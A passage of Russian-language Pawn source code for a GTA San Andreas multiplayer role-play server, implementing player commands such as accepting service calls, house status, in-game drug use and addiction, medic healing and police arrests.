	else if(GetPVarInt(params[0],"GoViz") == 3 && GetPVarInt(playerid,"Meh") == 0) return SendClientMessage(playerid, CGREY, "Вы не можете принять данный вызов");
	switch(GetPVarInt(params[0],"GoViz"))
	{
	    case 1:
	    {
			static const fmt_string1[] = "[R] %s принял вызов у %s";
			new str1[sizeof(fmt_string1)+32+32];
			format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername],PlayerInfo[params[0]][pSendername]);
			SendCopsMessage(str1);
	    }
	    case 2:
	    {
			static const fmt_string1[] = "[R] %s принял вызов у %s";
			new str1[sizeof(fmt_string1)+32+32];
			format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername],PlayerInfo[params[0]][pSendername]);
			SendFMes(F_HOSPITAL_LS,COLOR_SKLAD,str1);
	    }
	    case 3:
	    {
			static const fmt_string1[] = "[J] %s принял вызов у %s";
			new str1[sizeof(fmt_string1)+32+32];
			format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername],PlayerInfo[params[0]][pSendername]);
			for(new i = 0; i < MAX_PLAYERS; i++)
			{
			    if(!IsPlayerConnected(i) || PlayerLogged[i] == false) continue;
				if(GetPVarInt(i,"Taxist") > 0) SendClientMessage(i,COLOR_SKLAD,str1);
			}
	    }
	    case 4:
	    {
			static const fmt_string1[] = "[J] %s принял вызов у %s";
			new str1[sizeof(fmt_string1)+32+32];
			format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername],PlayerInfo[params[0]][pSendername]);
			for(new i = 0; i < MAX_PLAYERS; i++)
			{
			    if(!IsPlayerConnected(i) || PlayerLogged[i] == false) continue;
				if(GetPVarInt(i,"Meh") > 0) SendClientMessage(i,COLOR_SKLAD,str1);
			}
	    }
	}
	new Float:x,Float:y,Float:z;
	GetPlayerPos(params[0],x,y,z);
	SetPlayerRaceCheckpoint(playerid,2,x, y, z,0,0,0,10);
	SetPVarInt(playerid,"GPS",1);
	SendClientMessage(playerid,-1,"Вы приняли вызов. Местоположение игрока отмечено на карте.");
	static const fmt_string2[] = "%s принял Ваш вызов. Ожидайте его прибытия.";
	new str2[sizeof(fmt_string2)+32];
	format(str2, sizeof(str2), fmt_string2,PlayerInfo[playerid][pSendername]);
	SendClientMessage(params[0],CREWARD,str2);
	DeletePVar(params[0],"GoViz");
	return true;
}
CMD:house(playerid, params[])
{
    if(PlayerLogged[playerid] == false) return true;
    if(GetPlayerHouse(playerid))
    {
        new i = GetPVarInt(playerid,"PlayerHouse");
        new text[20],text1[20];
        switch(HInfo[i][hLock])
        {
            case 0: text = "Открыт";
            case 1: text = "Закрыт";
        }
        switch(HInfo[i][hOplata])
        {
            case 0: text1 = "Не оплачен";
            default: format(text1,sizeof(text1),"%s",timec(HInfo[i][hOplata]));
        }
  		static const fmt_str[] = "{FFFFFF}Дом:\t\t\t{f7ae11}№%i{FFFFFF}\nКласс:\t\t\t{f7ae11}%s{FFFFFF}\nСтатус:\t\t\t{f7ae11}%s{FFFFFF}\nОплачен на:\t\t{f7ae11}%s{FFFFFF}";
		new string[sizeof(fmt_str)+200];
		format(string, sizeof(string), fmt_str,i,HInfo[i][hClass],text,text1);
		ShowPlayerDialog(playerid,115,DIALOG_STYLE_MSGBOX,"Управление домом",string,"Изменить","Отмена");

    }
    else SendClientMessage(playerid,CGREY,"Вы не владете домом");
    return true;
}
CMD:ud(playerid, params[]) cmd_usedrugs(playerid,params);
CMD:godonate(playerid, params[])
{
    if(PlayerLogged[playerid] == false) return true;
    if(PlayerInfo[playerid][pAdmin] < 6|| AdminLogged[playerid] == false ) return true;
	if(sscanf(params, "i", params[0])) return SendClientMessage(playerid, CGREY, "Введите: /godonate [кол-во]");
	static const fmt_string1[] = "%s%i%s%s%i%s%s%i = %i";
	new str1[sizeof(fmt_string1)+300];
	format(str1, sizeof(str1), fmt_string1,GeneratePassword(),random(9),GeneratePassword(),GeneratePassword(),random(9),GeneratePassword(),GeneratePassword(),random(9),params[0]);
	SendClientMessage(playerid,-1,str1);
	return true;
}
function DrugEffectGone(playerid)
{
	new time[3];
	gettime(time[0], time[1], time[2]);
	SetPlayerTime(playerid, time[0], time[1]);
	SetPlayerWeather(playerid, wather);
	SetPlayerDrunkLevel (playerid, 0);
	return true;
}

CMD:usedrugs(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(sscanf(params, "i", params[0])) return SendClientMessage(playerid, CGREY, "Введите: /usedrugs [кол-во]");
	if(params[0] < 1 || params[0] > 5) return SendClientMessage(playerid,CGREY,"Вы можете использовать от 1 до 5 граммов наркотиков");
	if(PlayerInfo[playerid][pDrugs] < params[0]) return SendClientMessage(playerid,CGREY,"У Вас нет такого кол-ва наркотиков");
	if(GetPlayerDrunkLevel(playerid) > 10) return SendClientMessage(playerid,CGREY,"Вы не можете сейчас употребить наркотики");
	if(GetPlayerInterior(playerid) || GetPlayerVirtualWorld(playerid)) return SendClientMessage(playerid,CGREY,"Использовать наркотики можно только на улице");
	if(GetPVarInt(playerid,"DrugsDamag") > gettime()) return SendClientMessage(playerid, CGREY, "Нельзя уптребить наркотики во время борьбы");
	new nark = PlayerInfo[playerid][pZavisimost];
	PlayerInfo[playerid][pZavisimost] += params[0];
    PlayerInfo[playerid][pDrugs] -= params[0];
    InvMinus(playerid,337,params[0]);
	new Float:hl;
	GetPlayerHealth(playerid,hl);
	if(10*params[0]+hl > 120) SetHealth(playerid,120);
	else SetHealth(playerid,10*params[0]+hl);
	SetTimerEx("DrugEffectGone", 30000*params[0], false, "i", playerid);
	SetPlayerTime(playerid,17,0);
	SetPlayerDrunkLevel(playerid, 20000);
	SetPlayerWeather(playerid, -68);
	if(PlayerInfo[playerid][pGolod] > 4) SetGolod(playerid,PlayerInfo[playerid][pGolod]-5);
	static const fmt_string1[] = "%s достал пакетик и выкурил его";
	new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME];
	format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername]);
	ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str1);
	SetPlayerChatBubble(playerid, "достал пакетик и выкурил его", COLOR_PURPLE, 30.0, 7000);
	SetPVarInt(playerid,"AntiSbiv",1);
	SetPVarInt(playerid,"Sbiv",gettime() + 5);
	if((nark < 10 && PlayerInfo[playerid][pZavisimost] > 10) ||
	(nark < 20 && PlayerInfo[playerid][pZavisimost] > 20) || (nark < 30 && PlayerInfo[playerid][pZavisimost] > 30) ||
	(nark < 40 && PlayerInfo[playerid][pZavisimost] > 40) || (nark < 50 && PlayerInfo[playerid][pZavisimost] > 50) ||
	(nark < 60 && PlayerInfo[playerid][pZavisimost] > 60) || (nark < 70 && PlayerInfo[playerid][pZavisimost] > 70) ||
	(nark < 80 && PlayerInfo[playerid][pZavisimost] > 80)  || (nark < 90 && PlayerInfo[playerid][pZavisimost] > 90) ||
	PlayerInfo[playerid][pZavisimost] == 100)
	{
        static const fmt_strin3g1[] = "Ваша наркозависимость: %d";
		new str3[sizeof(fmt_strin3g1)+MAX_PLAYER_NAME];
		format(str3, sizeof(str3), fmt_strin3g1,PlayerInfo[playerid][pZavisimost]);
		SendClientMessage(playerid,COLOR_PURPLE,str3);
	}
	if(GetPVarInt(playerid,"Lomka"))
	{
	    ClearAnim(playerid);
	    KillTimer(GetPVarInt(playerid,"Lomka"));
	    DeletePVar(playerid,"Lomka");
	    DeletePVar(playerid,"AntiSbiv");
		DeletePVar(playerid,"Sbiv");
	}
	else
	{
	    if(PlayerInfo[playerid][pZavisimost] > 50 && PlayerInfo[playerid][pLomka] < gettime())
	    {
			if(PlayerInfo[playerid][pZavisimost] > 50 && PlayerInfo[playerid][pZavisimost] < 70) PlayerInfo[playerid][pLomka] = gettime()+60*60;
			if(PlayerInfo[playerid][pZavisimost] > 70 && PlayerInfo[playerid][pZavisimost] < 80) PlayerInfo[playerid][pLomka] = gettime()+60*50;
			if(PlayerInfo[playerid][pZavisimost] > 90 && PlayerInfo[playerid][pZavisimost] < 90) PlayerInfo[playerid][pLomka] = gettime()+60*40;
			if(PlayerInfo[playerid][pZavisimost] == 100) PlayerInfo[playerid][pLomka] = gettime()+60*30;
		}
	}
	ApplyAnimation(playerid,"ped","gum_eat",4.0,0,0,0,0,0,1);
	return true;
}
/*CMD:transferweapon(playerid, params[])
{
	if(PlayerLogged[playerid] == false || GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return true;
	if(sscanf(params, "ud", params[0])) return SendClientMessage(playerid, CGREY, "Введите: /transferweapon [id]");
    new Float:x,Float:y,Float:z;
	GetPlayerPos(params[0],x,y,z);
	if(!IsPlayerInRangeOfPoint(playerid, 5.0, x,y,z) || params[0] == playerid) return SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
	if(GetPlayerState(params[0]) != PLAYER_STATE_ONFOOT) return true;
	if(!GetPlayerWeapon(playerid)) return SendClientMessage(playerid,CGREY,"У Вас нет оружия в руках");
	new slot = Slot(GetPlayerWeapon(playerid));
	if(GunInfo[params[0]][pWeapon][slot] != GetPlayerWeapon(playerid) && GunInfo[params[0]][pAmmo][slot]) return SendClientMessage(playerid,CGREY,"У игрока есть оружие другого типа");
    GivePlayerWeapon(params[0],GunInfo[playerid][pWeapon][slot],GunInfo[playerid][pAmmo][slot]);
    GunInfo[playerid][pWeapon][slot] = 0;
    GunInfo[playerid][pAmmo][slot] = 0;
    SetPVarInt(playerid,"GiveGun",1);
    ResetPlayerWeapons(playerid);
    GivePatr(playerid);
 	static const fmt_string1[] = "Вы передали %s оружие";
	new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME];
	format(str1, sizeof(str1), fmt_string1,PlayerInfo[params[0]][pSendername]);
	SendClientMessage(playerid,CREWARD,str1);
	static const fmt_string2[] = "%s передал Вам оружие";
	new str2[sizeof(fmt_string2)+MAX_PLAYER_NAME];
	format(str2, sizeof(str2), fmt_string2,PlayerInfo[playerid][pSendername]);
	SendClientMessage(params[0],CREWARD,str2);
	return true;
}
CMD:transfermats(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(sscanf(params, "ud", params[0], params[1]) || params[1] < 1) return SendClientMessage(playerid, CGREY, "Введите: /transfermats [id] [кол-во]");
    if(PlayerInfo[playerid][pMats] < params[1]) return SendClientMessage(playerid, CGREY, "Недостаточно материалов");
    new Float:x,Float:y,Float:z;
	GetPlayerPos(params[0],x,y,z);
	if(!IsPlayerInRangeOfPoint(playerid, 5.0, x,y,z) || params[0] == playerid) return SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
 	if(!PlayerInfo[params[0]][pUl][2])
 	{
 		if(PlayerInfo[params[0]][pMats]+params[1] > 500) return SendClientMessage(playerid, CGREY, "У игрока недостаточно места");
 	}
 	else
 	{
 	    if(PlayerInfo[params[0]][pMats]+params[1] > 1000) return SendClientMessage(playerid, CGREY, "У игрока недостаточно места");
 	}
 	PlayerInfo[playerid][pMats] -= params[1];
	InvMinus(playerid,447,params[1]);
 	PlayerInfo[params[0]][pMats] += params[1];
 	GiveInv(playerid,447,params[1]);
 	static const fmt_string1[] = "Вы передали %s %i материалов";
	new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME+10];
	format(str1, sizeof(str1), fmt_string1,PlayerInfo[params[0]][pSendername],params[1]);
	SendClientMessage(playerid,CREWARD,str1);
	static const fmt_string2[] = "%s передал Вам %i материалов";
	new str2[sizeof(fmt_string2)+MAX_PLAYER_NAME+10];
	format(str2, sizeof(str2), fmt_string2,PlayerInfo[playerid][pSendername],params[1]);
	SendClientMessage(params[0],CREWARD,str2);
	return true;
}
CMD:transferdrugs(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(sscanf(params, "ud", params[0], params[1]) || params[1] < 1) return SendClientMessage(playerid, CGREY, "Введите: /transferdrugs [id] [кол-во]");
    if(PlayerInfo[playerid][pDrugs] < params[1]) return SendClientMessage(playerid, CGREY, "Недостаточно материалов");
    new Float:x,Float:y,Float:z;
	GetPlayerPos(params[0],x,y,z);
	if(!IsPlayerInRangeOfPoint(playerid, 5.0, x,y,z) || params[0] == playerid) return SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
 	if(!PlayerInfo[params[0]][pUl][2])
 	{
 		if(PlayerInfo[params[0]][pDrugs]+params[1] > 500) return SendClientMessage(playerid, CGREY, "У игрока недостаточно места");
 	}
 	else
 	{
 	    if(PlayerInfo[params[0]][pDrugs]+params[1] > 1000) return SendClientMessage(playerid, CGREY, "У игрока недостаточно места");
 	}
 	PlayerInfo[playerid][pDrugs] -= params[1];
 	InvMinus(playerid,337,params[1]);
 	PlayerInfo[params[0]][pDrugs] += params[1];
 	GiveInv(playerid,337,params[1]);
 	static const fmt_string1[] = "Вы передали %s %i наркотиков";
	new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME+10];
	format(str1, sizeof(str1), fmt_string1,PlayerInfo[params[0]][pSendername],params[1]);
	SendClientMessage(playerid,CREWARD,str1);
	static const fmt_string2[] = "%s передал Вам %i наркотиков";
	new str2[sizeof(fmt_string2)+MAX_PLAYER_NAME+10];
	format(str2, sizeof(str2), fmt_string2,PlayerInfo[playerid][pSendername],params[1]);
	SendClientMessage(params[0],CREWARD,str2);
	return true;
}*/
CMD:drop(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
   /* if(!strcmp(params, "drugs", true))
    {
        if(!PlayerInfo[playerid][pDrugs]) return SendClientMessage(playerid,CGREY,"У Вас нет наркотиков");
        InvMinus(playerid,337,PlayerInfo[playerid][pDrugs]);
        PlayerInfo[playerid][pDrugs] = 0;
		static const fmt_string1[] = "%s достал пакетики и откинул их в сторону";
		new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME];
		format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername]);
		ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str1);
		SetPlayerChatBubble(playerid, "достал пакетики и откинул их всторону", COLOR_PURPLE, 30.0, 7000);
    }
    else if(!strcmp(params, "mats", true))
    {
        if(!PlayerInfo[playerid][pMats]) return SendClientMessage(playerid,CGREY,"У Вас нет материалов");
        InvMinus(playerid,447,PlayerInfo[playerid][pMats]);
        PlayerInfo[playerid][pMats] = 0;
        
		static const fmt_string1[] = "%s достал материалы и откинул их в сторону";
		new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME];
		format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername]);
		ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str1);
		SetPlayerChatBubble(playerid, "достал материалы и откинул их всторону", COLOR_PURPLE, 30.0, 7000);
    }
    if(!strcmp(params, "box", true))
    {
        if(!GetPVarInt(playerid,"AmmoVR")) return SendClientMessage(playerid,CGREY,"У Вас нет ящика с материалами");
		DeletePVar(playerid,"AmmoVR");
		SetPlayerSpecialAction(playerid,0);
		if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
		ApplyAnimation(playerid, "CARRY", "PUTDWN", 4.1, 0, 0, 0, 0, 0,1);
		static const fmt_string1[] = "%s выбросил ящик";
		new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME];
		format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername]);
		ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str1);
		SetPlayerChatBubble(playerid, "выбросил ящик", COLOR_PURPLE, 30.0, 7000);
    }
	else SendClientMessage(playerid, CGREY, "Введите: /drop [drugs/mats/box]");*/
	if(!GetPVarInt(playerid,"AmmoVR")) return SendClientMessage(playerid,CGREY,"У Вас нет ящика с материалами");
	DeletePVar(playerid,"AmmoVR");
	SetPlayerSpecialAction(playerid,0);
	if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
	ApplyAnimation(playerid, "CARRY", "PUTDWN", 4.1, 0, 0, 0, 0, 0,1);
	static const fmt_string1[] = "%s выбросил ящик";
	new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME];
	format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername]);
	ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str1);
	SetPlayerChatBubble(playerid, "выбросил ящик", COLOR_PURPLE, 30.0, 7000);
	return true;
}

/*CMD:spawnpd(playerid)
{
    if(PlayerLogged[playerid] == false) return true;
    if(PlayerInfo[playerid][pMember] != F_LVPD) return SendClientMessage(playerid,CGREY,"Вы не состоите в полиции");
	ShowPlayerDialog(playerid,328,DIALOG_STYLE_LIST,"Изменить место появления","Главный офис\nТюрьма","Далее","Назад");
	return true;
}
*/
CMD:spawnchange(playerid)
{
    if(PlayerLogged[playerid] == false) return true;
//    if(PlayerInfo[playerid][pMember] == 0) return SendClientMessage(playerid,CGREY,"Вы не состоите в организации");
	ShowPlayerDialog(playerid,330,DIALOG_STYLE_LIST,"Изменить место появления","1 | Обычное место\n2 | База организации\n3 | Жильё\n4 | Дом семьи","Далее","Отмена");
	return true;
}
CMD:setsex(playerid,params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pMember] == F_HOSPITAL_LS )
	{
		if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 416 || GetVehicleModel(GetPlayerVehicleID(playerid)) == 563 || IsPlayerInRangeOfPoint(playerid, 100.0,-10.4762,150.6844,999.0613))
		{
		    if(PlayerInfo[playerid][pWork] == 0) return SendClientMessage(playerid,CGREY,"Начните рабочий день на базе организации");
		    if(PlayerInfo[playerid][pRank] < 3) return SendClientMessage(playerid,CGREY,"Данная команда Вам недоступна");
		    if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /setsex [id]");
			new Float:x,Float:y,Float:z;
			GetPlayerPos(params[0],x,y,z);
			if(!IsPlayerInRangeOfPoint(playerid, 7.0, x,y,z)) return SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
			if(GetPred(params[0]) == 1) return SendClientMessage(playerid,CGREY,"Игроку уже кто-то что-то предложил");
			new Float:health;
			GetVehicleHealth(params[0],health);
			SendClientMessage(playerid,CREWARD,"Вы предложили игроку сменить пол");
			static const fmt_string1[] = "%s предложил Вам сменить пол. Цена: $3000";
			new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME+3];
			format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername]);
			SendClientMessage(params[0],0xFF7F50FF,str1);
			SendClientMessage(params[0],CWHITE,"Для согласия нажмите{FF7F50} [Y]{FFFFFF} ,для отказа нажмите {FF7F50}[N]");
			SetPVarInt(params[0],"SexID",playerid);
			SetPVarInt(params[0],"Sex",1);
   		}
		else SendClientMessage(playerid, CGREY, "Вы должны находиться в специализированном транспорте или в больнице");
	}
	else SendClientMessage(playerid,CGREY,"Вам недоступна данная команда");
	return true;
}
CMD:helpdrugs(playerid,params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pMember] == F_HOSPITAL_LS )
	{
	    if(PlayerInfo[playerid][pWork] == 0) return SendClientMessage(playerid,CGREY,"Начните рабочий день на базе организации");
	    if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /helpdrugs [id]");
	    if(!IsPlayerConnected(params[0]) || PlayerLogged[params[0]] == false || playerid == params[0]) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
	    new Float:x,Float:y,Float:z;
		GetPlayerPos(params[0],x,y,z);
		if(!IsPlayerInRangeOfPoint(playerid, 7.0, x,y,z)) return SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
		if(!GetPVarInt(params[0],"Lomka")) return SendClientMessage(playerid,CGREY,"У игрока нет ломки");
	    ClearAnim(params[0]);
	    KillTimer(GetPVarInt(params[0],"Lomka"));
	    DeletePVar(params[0],"Lomka");
	    DeletePVar(params[0],"AntiSbiv");
		DeletePVar(params[0],"Sbiv");
		SendClientMessage(params[0],CREWARD,"Вас избавили от ломки");
		SendClientMessage(playerid,CREWARD,"Игрок избавлен от ломки");
	}
	else SendClientMessage(playerid,CGREY,"Вам недоступна данная команда");
	return 1;
}
CMD:healdrugs(playerid,params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pMember] == F_HOSPITAL_LS )
	{
	    new ke2k = 0;
	    if(IsPlayerInRangeOfPoint(playerid, 100.0,-10.4762,150.6844,999.0613) || GetPVarInt(playerid,"HealP")  || GetVehicleModel(GetPlayerVehicleID(playerid)) == 416 || GetVehicleModel(GetPlayerVehicleID(playerid)) == 563) ke2k++;
		if(ke2k > 0)
		{
		    if(PlayerInfo[playerid][pWork] == 0) return SendClientMessage(playerid,CGREY,"Начните рабочий день на базе организации");
		    if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /healdrugs [id]");
		    if(!IsPlayerConnected(params[0]) || PlayerLogged[params[0]] == false || playerid == params[0]) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
			new Float:x,Float:y,Float:z;
			GetPlayerPos(params[0],x,y,z);
			if(!IsPlayerInRangeOfPoint(playerid, 7.0, x,y,z)) return SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
			if(GetPred(params[0]) == 1) return SendClientMessage(playerid,CGREY,"Игроку уже кто-то что-то предложил");
			if(!PlayerInfo[params[0]][pZavisimost]) return SendClientMessage(playerid,CGREY,"У игрока нет зависимости");
			SendClientMessage(playerid,CREWARD,"Вы предложили игроку пройти курс от наркозависимости");
			static const fmt_string1[] = "%s предложил Вам пройти курс от наркозависимости. Цена: $5000";
			new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME+3];
			format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername]);
			SendClientMessage(params[0],0xFF7F50FF,str1);
			SendClientMessage(params[0],CWHITE,"Для согласия нажмите{FF7F50} [Y]{FFFFFF} ,для отказа нажмите {FF7F50}[N]");
			SetPVarInt(params[0],"VlID1",playerid);
			SetPVarInt(params[0],"Vl1",1);
		}
		else SendClientMessage(playerid, CGREY, "Вы должны находиться в специализированном транспорте,в больнице или иметь аптечку");
	}
	else SendClientMessage(playerid,CGREY,"Вам недоступна данная команда");
	return true;
}
CMD:heal(playerid,params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pMember] == F_HOSPITAL_LS )
	{
	    new ke2k = 0;
	    if(IsPlayerInRangeOfPoint(playerid, 100.0,-10.4762,150.6844,999.0613) || GetPVarInt(playerid,"HealP")  || GetVehicleModel(GetPlayerVehicleID(playerid)) == 416 || GetVehicleModel(GetPlayerVehicleID(playerid)) == 563) ke2k++;
		if(ke2k > 0)
		{
		    if(PlayerInfo[playerid][pWork] == 0) return SendClientMessage(playerid,CGREY,"Начните рабочий день на базе организации");
		    if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /heal [id]");
		    if(!IsPlayerConnected(params[0]) || PlayerLogged[params[0]] == false || playerid == params[0]) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
			new Float:x,Float:y,Float:z;
			GetPlayerPos(params[0],x,y,z);
			if(!IsPlayerInRangeOfPoint(playerid, 7.0, x,y,z)) return SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
			if(GetPred(params[0]) == 1) return SendClientMessage(playerid,CGREY,"Игроку уже кто-то что-то предложил");
			new Float:hl;
			GetPlayerHealth(params[0],hl);
			new kek = 100-floatround(hl)*3;
			SendClientMessage(playerid,CREWARD,"Вы предложили игроку вылечится");
			static const fmt_string1[] = "%s предложил Вам вылечится. Цена: $%i";
			new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME+3];
			format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername],kek);
			SendClientMessage(params[0],0xFF7F50FF,str1);
			SendClientMessage(params[0],CWHITE,"Для согласия нажмите{FF7F50} [Y]{FFFFFF} ,для отказа нажмите {FF7F50}[N]");
			SetPVarInt(params[0],"VlID",playerid);
			SetPVarInt(params[0],"Vl",1);
			SetPVarInt(params[0],"VlCena",kek);
		}
		else SendClientMessage(playerid, CGREY, "Вы должны находиться в специализированном транспорте,в больнице или иметь аптечку");
	}
	else SendClientMessage(playerid,CGREY,"Вам недоступна данная команда");
	return true;
}
CMD:n(playerid)
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pMember] == F_NEWS )
	{
		if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 582 || GetVehicleModel(GetPlayerVehicleID(playerid)) == 488 || IsPlayerInRangeOfPoint(playerid, 15.0,1377.7203,-30.6093,1000.9163) && GetPlayerInterior(playerid) == 45)
		{
		    if(PlayerInfo[playerid][pWork] == 0) return SendClientMessage(playerid,CGREY,"Начните рабочий день на базе организации");
		    static const fmt_string[] = "{FFFFFF}%s\n%s прием звонков\n%s прием SMS\nПригласить в эфир\nВыгнать из эфира\nОбъявления";
			new str[sizeof(fmt_string)+60];
			format(str, sizeof(str), fmt_string,(!GetPVarInt(playerid,"Efir")) ? ("Выйти в эфир"):("Выйти из эфира"),(!zvon) ? ("Включить"):("Выключить"),(!sms) ? ("Включить"):("Выключить"));
		    ShowPlayerDialog(playerid,105,DIALOG_STYLE_LIST,"Панель новостей",str,"Далее","Назад");
   		}
		else SendClientMessage(playerid, CGREY, "Вы должны находиться в специализированном транспорте или около аппаратуры в здании Central News Network");
	}
	else SendClientMessage(playerid,CGREY,"Вам недоступна данная команда");
	return true;
}
CMD:cb(playerid, params[])
{
    if(PlayerLogged[playerid] == false) return 1;
    if(IsACop(playerid))
    {
        if(PlayerInfo[playerid][pWork] == 0) return SendClientMessage(playerid,CGREY,"Начните рабочий день на базе организации");
        if(GetPlayerVirtualWorld(playerid) || GetPlayerInterior(playerid)) return SendClientMessage(playerid,CGREY,"Нельзя вызвать подкрепление в интерьере");
        static const fmt_string[] = "[R] %s вызывает подкрепление. Точка указана на карте!";
		new str[sizeof(fmt_string)+MAX_PLAYER_NAME];
		format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername]);
		SendFMes(PlayerInfo[playerid][pMember],COLOR_SKLAD,str);
		new Float:x,Float:y,Float:z;
		GetPlayerPos(playerid,x,y,z);
		for(new i = 0; i < MAX_PLAYERS; i++)
		{
		    if(!IsPlayerConnected(i) || PlayerLogged[i] == false || !IsACop(i) || i == playerid) continue;
		    if(GetPVarInt(i,"Mar") > 0 && GetPVarInt(i,"Mar") < 4 || GetPVarInt(i,"Mar") == 6 || GetPVarInt(i,"InDrift")) continue;
            SetPlayerRaceCheckpoint(i,2,x,y,z,0,0,0,10); //apt
	    	SetPVarInt(i,"GPS",1);
		}
    }
    else SendClientMessage(playerid,CGREY,"Вам недоступна данная команда");
    return true;
}

CMD:arrest(playerid, params[])
{
    if(PlayerLogged[playerid] == false) return 1;
    if(IsACop(playerid))
    {
        if(PlayerInfo[playerid][pWork] == 0) return SendClientMessage(playerid,CGREY,"Начните рабочий день на базе организации");
        if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /arrest [id]");
        if(IsPlayerInRangeOfPoint(playerid, 20.0, -0.2129,-25.2112,1999.5859) && PlayerInfo[params[0]][pWanted] > 4)
		{
		    PlayerInfo[params[0]][pJail] = 1;
		    if(PlayerInfo[playerid][pFreeTime] > gettime()) PlayerInfo[params[0]][pJailTime] = (PlayerInfo[params[0]][pWanted]*60*6)*2;
		    else PlayerInfo[params[0]][pJailTime] = PlayerInfo[params[0]][pWanted]*60*6;
		    SetPVarInt(params[0],"Freeze",1);
		    PlayerInfo[params[0]][pWantedA] = PlayerInfo[params[0]][pWanted];
		    new rand = random(16);
			SetPlayerPos(params[0],JailPos[rand][0],JailPos[rand][1],JailPos[rand][2]);
			SetPlayerFacingAngle(params[0],JailPos[rand][3]);
            PlayerInfo[playerid][pPayDay] += 10*PlayerInfo[params[0]][pWanted];
            PlayerInfo[params[0]][pZakon] -= 5;
			static const fmt_string2[] = "Вы поймали преступника! К вашей зарплате прибавлено $%i";
			new str2[sizeof(fmt_string2)+5];
			format(str2, sizeof(str2), fmt_string2,20*PlayerInfo[params[0]][pWanted]);
	  		SendClientMessage(playerid,CREWARD,str2);
			TogglePlayerControllable(params[0], 1);
			SetPlayerVirtualWorld(params[0], 1);
		    SetPlayerWantedLevel(params[0],0);
		    PlayerInfo[params[0]][pWanted] = 0;
		    PlayerInfo[params[0]][pAr]++;
			DeletePVar(params[0],"Progulka");
		    static const fmt_string3[] = "Вы арестованы! До выхода на свободу: %d мин.";
			new str3[sizeof(fmt_string3)+5];
			format(str3, sizeof(str3), fmt_string3,PlayerInfo[params[0]][pJailTime]/60);
	  		SendClientMessage(params[0],CREWARD,str3);
	  		if(!PlayerInfo[playerid][pQuestS][16])
			{
				PlayerQuest[playerid][16][0]++;
				CheckQuest(playerid,16);
			}
		    
		}
		else if(IsPlayerInRangeOfPoint(playerid, 20.0, 1568.7094,-1689.9719,6.2188) && PlayerInfo[params[0]][pWanted] < 4)
		{
		    PlayerInfo[params[0]][pJail] = 3;
		    PlayerInfo[params[0]][pJailTime] = PlayerInfo[params[0]][pWanted]*60*6;
		    SetPVarInt(params[0],"Freeze",1);
			new rand = random(4);
			SetPlayerPos(params[0],KPZPos[rand][0],KPZPos[rand][1],KPZPos[rand][2]);
			SetPlayerFacingAngle(params[0],KPZPos[rand][3]);
            PlayerInfo[playerid][pPayDay] += 20*PlayerInfo[params[0]][pWanted];
            PlayerInfo[params[0]][pZakon] -= 5;
            Uncuff(params[0]);
			static const fmt_string2[] = "Вы поймали преступника! К вашей зарплате прибавлено $%i";
			new str2[sizeof(fmt_string2)+5];
			format(str2, sizeof(str2), fmt_string2,20*PlayerInfo[params[0]][pWanted]);
